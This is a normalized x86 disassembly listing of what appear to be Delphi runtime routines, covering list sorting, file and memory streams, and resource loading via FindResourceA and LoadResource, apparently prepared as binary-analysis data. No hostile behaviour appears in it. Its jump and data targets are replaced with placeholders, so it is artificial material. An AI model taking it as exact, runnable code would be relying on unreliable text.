mov al [ esp + 0x8 ]
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebx [ esp + 0xc ]
add ebx esi
shr ebx 0x1
mov eax [ edi + 0x10 ]
mov edx [ eax + ebx * 8 ]
mov ecx [ esp ]
mov eax edi
mov ebp [ eax ]
call [ ebp + 0x34 ]
test eax eax
jge r-xdata
mov edx ebx
dec edx
mov [ esp + 0xc ] edx
test eax eax
jne r-xdata
lea esi [ ebx + 0x1 ]
jmp r-xdata
cmp esi [ esp + 0xc ]
jle r-xdata
mov [ esp + 0x8 ] 0x1
cmp [ edi + 0x1d ] 0x1
je r-xdata
mov esi ebx
sub_415944
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_414cb4
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax edi
mov edx [ ebx + 0x10 ]
mov edx [ edx + esi * 8 ]
call sub_403f3c
pop edi
pop esi
pop ebx
retn
sub_415980
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_414cb4
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax [ ebx + 0x10 ]
mov eax [ eax + esi * 8 + 0x4 ]
pop esi
pop ebx
retn
sub_4159a8
push esi
mov edx [ eax + 0x18 ]
cmp edx 0x40
jle r-xdata
cmp edx 0x8
jle r-xdata
mov esi edx
test esi esi
jns r-xdata
mov esi 0x4
mov esi 0x10
jmp r-xdata
sar esi 0x2
jmp r-xdata
add esi 0x3
add esi edx
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x28 ]
pop esi
retn
sub_4159dc
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x8c ]
test al al
jne r-xdata
mov edx esi
mov eax ebx
call sub_414f7c
mov [ esp ] eax
jmp r-xdata
mov eax [ esp ]
pop edx
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_415a28
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
je r-xdata
test esi esi
jl r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_414cb4
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_414cb4
cmp esi [ ebx + 0x14 ]
jle r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x88 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_415a7c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x14 ]
cmp eax [ ebx + 0x18 ]
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp esi eax
jge r-xdata
mov eax ebx
call sub_4159a8
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 ]
mov esi eax
xor eax eax
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
mov [ esi + 0x4 ] eax
mov eax esi
mov edx edi
call sub_403f3c
inc [ ebx + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov edx [ ebx + 0x10 ]
lea edx [ edx + esi * 8 + 0x8 ]
push edx
mov edx [ ebx + 0x10 ]
lea edx [ edx + esi * 8 ]
sub eax esi
mov ecx eax
shl ecx 0x3
mov eax edx
pop edx
call sub_4028d8
sub_415af4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
je r-xdata
test esi esi
jl r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_414cb4
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_414cb4
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 ]
mov edx edi
call sub_403f3c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_415b50
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_414cb4
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
mov [ eax + esi * 8 + 0x4 ] edi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_415b90
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call [ ebp + 0x8 ]
test eax eax
jl r-xdata
inc ebx
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call [ ebp + 0x8 ]
test eax eax
jg r-xdata
dec esi
cmp esi ebx
jl r-xdata
cmp esi ebx
jge r-xdata
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4158a8
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp esi [ ebp - 0x8 ]
jle r-xdata
cmp esi [ ebp - 0x10 ]
jne r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
mov [ ebp - 0x8 ] ebx
cmp ebx [ ebp - 0xc ]
jl r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_415b90
inc ebx
dec esi
mov [ ebp - 0x10 ] ebx
mov ebx [ ebp - 0x8 ]
mov esi [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0xc ]
shr eax 0x1
mov [ ebp - 0x10 ] eax
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_415c40
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x1c ]
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov [ esi + 0x1c ] bl
mov eax esi
mov edx [ eax ]
call [ edx + 0x90 ]
sub_415c9c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x14 ] 0x1
jle r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
push esi
mov ecx [ ebx + 0x14 ]
dec ecx
xor edx edx
mov eax ebx
call sub_415b90
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
sub_415cf0
add esp 0xfffffff8
push 0x0
push 0x0
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp ] eax
mov [ esp + 0x4 ] edx
mov eax [ esp ]
mov edx [ esp + 0x4 ]
pop ecx
pop edx
retn
sub_415d24
push ebx
add esp 0xfffffff0
mov ebx eax
push 0x0
push 0x0
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
push 0x0
push 0x0
mov dl 0x2
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp ] eax
mov [ esp + 0x4 ] edx
push [ esp + 0xc ]
push [ esp + 0xc ]
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ esp ]
mov edx [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_415d88
push ebp
mov ebp esp
mov ecx eax
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
jl r-xdata
cmp [ ebp + 0x8 ] 0x80000000
jb r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba84
call sub_403924
cmp [ ebp + 0xc ] 0x0
jne r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov edx eax
mov eax ecx
mov ecx [ eax ]
call [ ecx + 0x4 ]
pop ebp
retn 0x8
jmp r-xdata
sub_415ddc
push ebp
mov ebp esp
add esp 0xfffffef8
lea edx [ ebp - 0x108 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
call sub_4030e8
lea eax [ ebp - 0x108 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x4
lea eax [ ebp - 0x8 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bac0
call sub_403924
mov esp ebp
pop ebp
retn
sub_415e28
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
mov [ ebp - 0x1a ] cx
mov esi edx
mov [ ebp - 0x4 ] eax
lea ebx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ eax ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_4030e0
mov [ ebx ] eax
jmp r-xdata
cmp [ ebx ] 0x0
je r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
cmp eax [ r-xdata ]
jne r-xdata
mov [ ebp - 0x14 ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
push ebp
call sub_415ddc
pop ecx
mov eax [ ebx ]
call sub_403124
mov [ ebx ] eax
mov eax esi
cdq
push edx
push eax
mov dl [ ebp - 0x1a ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebp
call sub_415ddc
pop ecx
sub_415eac
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
jl r-xdata
cmp [ ebp + 0x8 ] 0x80000000
jb r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba84
call sub_403924
cmp [ ebp + 0xc ] 0x0
jne r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov edx eax
xor ecx ecx
mov cl bl
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x14 ]
cdq
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
jmp r-xdata
sub_415f1c
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov ecx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0xc ]
cmp ebx eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba84
call sub_403924
sub_415f54
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov ecx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x10 ]
cmp ebx eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba84
call sub_403924
sub_415f8c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0xf000
jbe r-xdata
push 0x0
push 0x0
mov eax edi
call sub_415d10
mov eax edi
mov edx [ eax ]
call [ edx ]
mov [ ebp + 0x8 ] eax
mov [ ebp + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x14 ] 0xf000
jmp r-xdata
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x14 ]
call sub_4026dc
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_416068
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x14 ]
cdq
cmp edx [ ebp + 0xc ]
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
jge r-xdata
cmp eax [ ebp + 0x8 ]
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41606f
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
call sub_4026fc
retn
mov ebx [ ebp + 0x8 ]
mov ebx [ ebp - 0x14 ]
jmp r-xdata
jmp r-xdata
mov esi [ ebp - 0x18 ]
mov edx esi
mov ecx ebx
mov eax edi
call sub_415f1c
mov edx esi
mov ecx ebx
mov eax [ ebp - 0x4 ]
call sub_415f54
mov eax ebx
cdq
sub [ ebp + 0x8 ] eax
sbb [ ebp + 0xc ] edx
sub_416080
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx edx
push 0x1000
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_416704
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4160d0
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_418738
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4160d7
mov eax [ ebp - 0x8 ]
call sub_403198
retn
sub_4160e0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403168
mov [ edi + 0x4 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034bc
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
sub_41613c
push ebp
mov ebp esp
add esp 0xfffffff8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
and edx 0x7f
mov eax [ eax + 0x4 ]
call sub_40845c
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop ecx
pop ecx
pop ebp
retn 0x8
sub_41617c
push ebp
mov ebp esp
push ebx
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ ebx + 0x4 ]
push eax
call SetEndOfFile
call sub_40ceec
pop ebx
pop ebp
retn 0x8
sub_4161a4
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov ax [ ebp + 0x8 ]
push eax
push 0x0
xor edx edx
mov eax esi
call sub_4161e8
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034bc
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
sub_4161e8
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x1c ] ebx
test dl dl
je r-xdata
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0xc ]
xor eax eax
push ebp
push sub_416311
push [ fs : eax ]
mov [ fs : eax ] esp
cmp di 0xffff
jne r-xdata
add esp 0xfffffff0
call sub_4034bc
movzx edx di
mov eax esi
call sub_408380
mov ecx eax
xor edx edx
mov eax ebx
call sub_4160e0
cmp [ ebx + 0x4 ] 0x0
jge r-xdata
mov edx [ ebp + 0x8 ]
mov eax esi
call sub_4083fc
mov ecx eax
xor edx edx
mov eax ebx
call sub_4160e0
cmp [ ebx + 0x4 ] 0x0
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416318
lea eax [ ebp - 0x24 ]
mov edx 0x4
call sub_403f0c
retn
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_408614
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
call GetLastError
lea edx [ ebp - 0x24 ]
call sub_40b1c0
mov eax [ ebp - 0x24 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0x14 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bac0
call sub_403924
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_408614
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
call GetLastError
lea edx [ ebp - 0x1c ]
call sub_40b1c0
mov eax [ ebp - 0x1c ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0x14 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bac0
call sub_403924
jmp r-xdata
sub_416318
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
sub_41633c
push ebx
push esi
call sub_403524
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
test eax eax
jl r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403188
test bl bl
jle r-xdata
call sub_408494
pop esi
pop ebx
retn
mov eax esi
call sub_40350c
sub_416378
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0xc ]
test edi edi
jl r-xdata
xor esi esi
test ecx ecx
jl r-xdata
mov esi [ ebx + 0x8 ]
sub esi edi
test esi esi
jle r-xdata
cmp ecx esi
jge r-xdata
mov eax [ ebx + 0x4 ]
add eax edi
mov ecx esi
call sub_4028d8
add [ ebx + 0xc ] esi
jmp r-xdata
mov esi ecx
mov eax esi
pop edi
pop esi
pop ebx
retn
sub_4163b0
sub cx 0x1
jb r-xdata
mov [ eax + 0xc ] edx
jmp r-xdata
je r-xdata
mov eax [ eax + 0xc ]
retn
add [ eax + 0xc ] edx
jmp r-xdata
dec cx
je r-xdata
add edx [ eax + 0x8 ]
mov [ eax + 0xc ] edx
jmp r-xdata
sub_4163d4
push ebx
push esi
call sub_403524
mov ebx edx
mov esi eax
mov eax esi
call sub_416400
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403188
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40350c
sub_416418
push ebx
push esi
push edi
mov edi edx
mov esi eax
push 0x0
push 0x0
mov eax edi
call sub_415d10
mov eax edi
mov edx [ eax ]
call [ edx ]
mov ebx eax
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x4 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ esi + 0x4 ]
mov ecx ebx
mov eax edi
call sub_415f1c
sub_416450
push ebx
push ecx
mov [ esp ] edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov edx eax
mov ecx [ ebx + 0x8 ]
mov eax ebx
call sub_416370
mov eax [ esp ]
mov [ ebx + 0x10 ] eax
pop edx
pop ebx
retn
sub_416478
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0xc ]
mov edx esi
mov eax ebx
call sub_416450
mov [ ebx + 0x8 ] esi
cmp esi edi
jge r-xdata
pop edi
pop esi
pop ebx
retn
mov cx 0x2
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x14 ]
sub_4164a4
push ebx
push esi
push edi
cmp [ edx ] 0x0
jle r-xdata
mov esi [ eax + 0x4 ]
mov ecx esi
mov edi [ edx ]
mov ebx [ eax + 0x10 ]
cmp edi ebx
je r-xdata
mov ecx [ edx ]
cmp ecx [ eax + 0x8 ]
je r-xdata
mov eax ecx
pop edi
pop esi
pop ebx
retn
cmp [ edx ] 0x0
jne r-xdata
mov ecx [ edx ]
add ecx 0x1fff
and ecx 0xffffe000
mov [ edx ] ecx
test ebx ebx
jne r-xdata
mov eax esi
call sub_4069a4
xor ecx ecx
jmp r-xdata
mov ecx [ rw-data ]
movzx ecx [ ecx ]
mov edx [ edx ]
mov eax esi
call sub_406988
mov ecx eax
mov eax [ rw-data ]
movzx eax [ eax ]
mov edx [ edx ]
call sub_406978
mov ecx eax
jmp r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba84
call sub_403924
test ecx ecx
jne r-xdata
sub_416530
push ebx
push esi
push edi
push ebp
mov esi ecx
mov ebp edx
mov ebx eax
mov eax [ ebx + 0xc ]
test eax eax
jl r-xdata
xor eax eax
test esi esi
jl r-xdata
mov edi eax
add edi esi
test edi edi
jle r-xdata
cmp edi [ ebx + 0x8 ]
jle r-xdata
mov edx [ ebx + 0x4 ]
add edx [ ebx + 0xc ]
mov eax ebp
mov ecx esi
call sub_4028d8
mov [ ebx + 0xc ] edi
mov eax esi
jmp r-xdata
cmp edi [ ebx + 0x10 ]
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ ebx + 0x8 ] edi
mov edx edi
mov eax ebx
call sub_416450
sub_416580
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403168
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
call sub_4043a8
mov ecx eax
mov edx esi
mov eax edi
call sub_416648
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034bc
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
sub_4165d8
push ebp
mov ebp esp
add esp 0xfffffff4
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41663b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x6
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405af8
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba04
call sub_403924
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416642
lea eax [ ebp - 0xc ]
call sub_403ee8
retn
sub_416648
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push esi
call FindResourceA
mov edi eax
mov [ ebx + 0x10 ] edi
test edi edi
jne r-xdata
mov eax [ ebx + 0x10 ]
push eax
push esi
call LoadResource
mov edi eax
mov [ ebx + 0x14 ] edi
test edi edi
jne r-xdata
push ebp
call sub_4165d8
pop ecx
mov eax [ ebx + 0x10 ]
push eax
push esi
call SizeofResource
push eax
mov eax [ ebx + 0x14 ]
push eax
call LockResource
mov edx eax
mov eax ebx
pop ecx
call sub_416370
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
push ebp
call sub_4165d8
pop ecx
sub_4166b4
push ebx
push esi
call sub_403524
mov ebx edx
mov esi eax
mov eax [ esi + 0x14 ]
call sub_406974
mov eax [ esi + 0x14 ]
push eax
call FreeResource
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403188
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40350c
sub_416704
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
mov esi [ ebp + 0x8 ]
mov [ edi + 0x4 ] ecx
mov eax esi
call sub_4026dc
mov [ edi + 0x8 ] eax
mov [ edi + 0xc ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034bc
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
sub_41674c
push ebx
push esi
call sub_403524
mov ebx edx
mov esi eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
test bl bl
jle r-xdata
mov edx [ esi + 0xc ]
call sub_4026fc
pop esi
pop ebx
retn
mov eax esi
call sub_40350c
sub_416850
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x4 ] ecx
mov eax [ ebp + 0x14 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov [ esi + 0xc ] eax
lea eax [ esi + 0x10 ]
mov edx [ ebp + 0xc ]
call sub_403f3c
lea eax [ esi + 0x14 ]
mov edx [ ebp + 0x8 ]
call sub_403f3c
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034bc
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x10
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
sub_4168a8
push ebx
push esi
push edi
push ebp
mov edi eax
xor eax eax
mov esi [ edi + 0x14 ]
mov ebx esi
jmp r-xdata
mov dl [ ebx ]
test dl dl
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
sub dl 0x2e
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp ebx
sub ebp esi
mov ecx ebp
lea eax [ edi + 0x10 ]
mov edx esi
call sub_403fd8
mov ecx ebp
inc ecx
lea eax [ edi + 0x14 ]
mov edx 0x1
call sub_404448
mov al 0x1
inc ebx
sub_416900
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_416977
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_405634
test esi esi
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x4 ]
call sub_411448
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41697e
lea eax [ ebp - 0x4 ]
call sub_405634
retn
mov eax [ ebx + 0xc ]
mov eax [ eax ]
mov eax [ eax ]
call sub_410d58
add eax 0x5
push eax
lea eax [ ebp - 0x4 ]
call sub_405634
mov ecx eax
mov eax esi
pop edx
call sub_40d3e0
test al al
jne r-xdata
lea eax [ ebp - 0x4 ]
call sub_405634
sub_416984
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_416a2a
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_416a31
lea eax [ ebp - 0x8 ]
call sub_403ee8
retn
mov edi esi
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax ebx
jmp r-xdata
mov [ ebp - 0x4 ] edi
mov dl [ ebx ]
test dl dl
je r-xdata
mov ecx ebx
sub ecx eax
lea edx [ ebp - 0x8 ]
xchg edx eax
call sub_403fd8
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_419f58
mov esi eax
test esi esi
jne r-xdata
add dl 0xd3
sub dl 0x2
jae r-xdata
test esi esi
je r-xdata
mov edx r-xdata
mov eax [ ebp - 0x8 ]
call sub_407d04
test al al
je r-xdata
inc ebx
cmp [ ebx ] 0x2e
jne r-xdata
mov esi edi
cmp [ ebx ] 0x2d
jne r-xdata
inc ebx
cmp [ ebx ] 0x3e
jne r-xdata
inc ebx
mov edi esi
inc ebx
sub_416a4c
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_4140f4
test eax eax
jge r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_4140f4
test eax eax
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_413eec
sub_416a84
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_4140f4
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx ebx
call sub_4140f4
test eax eax
jge r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
xchg edx eax
